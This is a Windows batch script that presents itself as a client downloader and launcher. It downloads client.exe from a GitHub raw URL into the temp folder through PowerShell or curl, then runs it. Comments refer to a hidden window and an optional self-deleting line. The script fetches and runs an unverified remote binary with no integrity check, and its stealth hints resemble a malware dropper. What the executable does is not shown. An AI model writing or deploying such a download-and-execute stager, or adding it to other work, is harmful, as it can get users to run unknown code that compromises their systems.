@echo off
title Client Downloader & Launcher
echo [*] Starting client deployment...

:: Set temp path for the executable
set "EXE_URL=https://raw.githubusercontent.com/Maximus16adrianu/arduinotest/main/client.exe"
set "EXE_PATH=%temp%\client.exe"

:: Delete old file if exists
if exist "%EXE_PATH%" del /f /q "%EXE_PATH%"

:: Download client.exe using PowerShell (fallback to curl if available)
echo [*] Downloading client.exe from GitHub...
powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'" 2>nul
if %errorlevel% neq 0 (
    echo [!] PowerShell failed, trying curl...
    curl -L -o "%EXE_PATH%" "%EXE_URL%"
    if %errorlevel% neq 0 (
        echo [X] Download failed. Exiting.
        pause
        exit /b 1
    )
)

:: Verify file exists
if not exist "%EXE_PATH%" (
    echo [X] Downloaded file not found. Exiting.
    pause
    exit /b 1
)

echo [✓] Download complete.

:: Run the client.exe (hidden window)
echo [*] Launching client.exe...
start "" "%EXE_PATH%"

:: Clean up the batch script itself (optional)
:: del /f /q "%~f0" 2>nul

exit /b 0
